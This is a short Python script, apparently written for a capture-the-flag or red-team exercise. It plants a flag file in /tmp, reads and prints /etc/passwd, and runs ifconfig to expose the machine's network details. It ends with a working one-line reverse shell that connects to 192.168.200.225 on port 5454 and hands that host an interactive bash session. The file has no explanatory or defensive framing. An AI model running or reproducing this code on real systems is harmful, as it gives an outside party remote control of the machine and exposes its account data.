import sys,os
#s = os.listdir('/tmp')
#tt = open('/tmp/team13.sh', "r")
f = open("/tmp/team4-flag5.txt","w")
f.write("We Are Here! How are you?")
pwd = open("/etc/passwd", "r")
pwdx = pwd.read()
net = os.system('ifconfig')
print("IP address of this machine: ",net)
print("\n\n /etc/passwd: ", pwdx)
print("Team4-LOG: File created successfully")
f.close()
#===================================================
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.200.225",5454));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
#====================================================
